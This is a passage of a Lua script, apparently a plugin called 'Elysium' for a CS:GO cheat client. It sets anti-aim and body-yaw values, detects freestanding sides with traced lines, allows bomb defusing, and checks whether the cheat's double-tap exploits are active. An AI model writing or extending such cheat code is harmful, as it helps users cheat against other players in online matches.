			ui_set(ref_body_yaw, 'Static')
		else
			ui_set(ref_body_yaw, 'Jitter')
		end
		if (side == 'left') then
			ui_set(ref_body_yaw_add, 180)
		else
			ui_set(ref_body_yaw_add, -180)
		end
		ui_set(ref_freestanding_body_yaw, false)
		ui_set(ref_fake_yaw_limit, 60)

		local distance = 100

		local bomb = entity_get_all("CPlantedC4")[1]
		local bomb_x, bomb_y, bomb_z = entity_get_prop(bomb, 'm_vecOrigin')
		local bomb_vec = vector(bomb_x, bomb_y, bomb_z)

		if (bomb_vec ~= nil) then
			local player_x, player_y, player_z = entity_get_prop(local_player, 'm_vecOrigin')
			local player_vec = vector(player_x, player_y, player_z)

			distance = player_vec:dist(bomb_vec)
		end

		local team_num = entity_get_prop(local_player, 'm_iTeamNum')
		local defusing = team_num == 3 and distance < 62

		if (not defusing) then
			event.in_use = 0			
		end

	end
end

function is_likely(percentage)
	local random = client_random_int(1, 100)
	return random <= percentage
end

--setup_command callback
client_set_event_callback('setup_command', function (event)
	if (ui_get(anti_aim_master_switch)) then
		if (ui_get(legit_anti_aim)) then
			set_legit_aa(event)
		else
			set_anti_aim()
		end
	end
end)
--setup_command callback

--checks if a player is in air
function in_air(player)
	if (not player) then
		return false
	end
	local flags = entity_get_prop(player, "m_fFlags")
	if (not flags) then
		return false
	end
	local ground = bit_band(flags, 1) == 0
	if (ground) then
		return true
	end
	return false
end
--checks if a player is in air

--calculates the velocity of a player
function get_velocity(player)
	if (not player) then
		return 0
	end
	local x,y,z = entity_get_prop(player, "m_vecVelocity")
	if (x == nil) then return 0 end
	return math.sqrt(x*x + y*y + z*z)
end
--calculates the velocity of a player

function get_freestanding_side(player)
    local trace_data = {left = 0, right = 0}
    if player then
        local x, y, z = client_eye_position()
        local _, yaw = client_camera_angles()

        for i = yaw - 90, yaw + 90, 30 do
            if i ~= yaw then
                local rad = math.rad(i)

                local px, py, pz = x + 256 * math.cos(rad), y + 256 * math.sin(rad), z

                local fraction = client_trace_line(player, x, y, z, px, py, pz)

                local side = i < yaw and 'left' or 'right'

                trace_data[side] = trace_data[side] + fraction
            end
        end
    end
    return trace_data.left < trace_data.right and 'left' or 'right'
end

--returns if the player is using any exploits
function is_exploiting()
	local double_tap = ui_get(ref_double_tap) and ui_get(ref_double_tap_key)
	local onshot_aa = ui_get(ref_onshot_aa) and ui_get(ref_onshot_aa_key)
	return double_tap or onshot_aa
end
--returns if the player is using any exploits

print('Loaded Elysium debug!')